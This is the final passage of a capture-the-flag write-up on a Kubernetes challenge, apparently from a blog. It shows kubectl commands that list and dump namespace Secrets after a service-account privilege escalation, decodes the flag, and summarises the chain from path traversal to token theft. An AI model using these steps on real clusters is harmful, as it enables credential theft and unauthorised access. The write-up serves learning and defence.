This confirmed that the escalation was successful. Unlike the previous accounts, `secret-lister-sa` was allowed to list and retrieve all Secrets within the namespace.

```bash
kubectl get secrets

NAME                        TYPE                                  DATA   AGE
aa                          kubernetes.io/service-account-token   3      5h41m
escalation-token            kubernetes.io/service-account-token   3      7m28s
flag0                       Opaque                                1      25d
flag2-secret                Opaque                                1      25d
lister-token-pwn            kubernetes.io/service-account-token   3      2d2h
my-escalative-token         kubernetes.io/service-account-token   3      2d1h
my-exploit-token            kubernetes.io/service-account-token   3      40h
my-secret                   Opaque                                1      26h
my-secret-lister-token      kubernetes.io/service-account-token   3      18h
pwn-token                   kubernetes.io/service-account-token   3      2d2h
pwn-token2                  kubernetes.io/service-account-token   3      2d2h
secret-lister-secret        kubernetes.io/service-account-token   3      5h38m
secret-lister-token         kubernetes.io/service-account-token   3      5h43m
secret-manager-token        kubernetes.io/service-account-token   3      25d
secret-sa-sample            kubernetes.io/service-account-token   4      26h
steal-lister-token          kubernetes.io/service-account-token   3      18h
very-secret-flag-4fbb3f5a   Opaque                                1      25d
```

The namespace contained numerous Secrets created by other participants, but one object immediately stood out: `very-secret-flag-4fbb3f5a`.

```bash
kubectl get secrets very-secret-flag-4fbb3f5a -o yaml
```

```yaml
apiVersion: v1
data:
  flag3-d86ffd8c.txt: SGV4QXszc2NhbDhlZC10MC10aDMtdDBwfQ==
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"very-secret-flag-4fbb3f5a","namespace":"bestit"},"stringData":{"flag3-d86ffd8c.txt":"HexA{3scal8ed-t0-th3-t0p}"},"type":"Opaque"}
  creationTimestamp: "2026-04-28T21:50:43Z"
  name: very-secret-flag-4fbb3f5a
  namespace: bestit
  resourceVersion: "408"
  uid: b21508d3-be64-4c31-b7cd-4ad7526e38d6
type: Opaque
```

Inspecting the Secret revealed a value named `flag3-d86ffd8c.txt`, which appeared to contain the final flag.

```bash
echo SGV4QXszc2NhbDhlZC10MC10aDMtdDBwfQ== | base64 -d

HexA{3scal8ed-t0-th3-t0p}
```

After decoding the value, the final flag was revealed: `HexA{3scal8ed-t0-th3-t0p}`. This completed the challenge and awarded the final 200 points.

<img class="screenshot" src="{{ "/assets/images/2026-05-30-cloud-security-challenge-for-kubernetes/06-scoreboard.png" | relative_url }}" alt="load">

## Conclusion

This challenge demonstrated how several seemingly limited Kubernetes permissions can be chained together to achieve privilege escalation.

The attack began with a path traversal vulnerability that exposed a service account token mounted inside a Pod. Using that token, I was able to enumerate Kubernetes resources and discover additional credentials exposed through mounted Secrets. Those credentials provided access to a more privileged service account, which in turn allowed the creation of a new service account token and escalation to an account capable of retrieving all Secrets within the namespace.

The challenge also highlighted the importance of network segmentation, especially in cloud-native environments. The initial service account token would have been far less useful if the Kubernetes API server had not been accessible from the Internet.

While this was a CTF challenge, the techniques involved are based on real Kubernetes concepts. Misconfigured RBAC permissions, exposed service account tokens, publicly accessible management interfaces, and overly permissive Secret access remain common sources of privilege escalation in Kubernetes environments. Individually, these issues may appear harmless, but when combined they can provide a clear path from an initial foothold to full compromise of a namespace.

Overall, this was a fun challenge that highlighted the importance of understanding Kubernetes authentication, authorization, network segmentation, and secret management from both operational and security perspectives.

## Sources

- [HackArcana Kubernetes Challenge](https://hackarcana.com/challenge/2026-Q2-k8s-challenge)
- [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Kubernetes API Collections](https://kubernetes.io/docs/reference/using-api/api-concepts/#collections)
- [Manually Create a Long-Lived Service Account Token](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#manually-create-a-long-lived-api-token-for-a-serviceaccount)
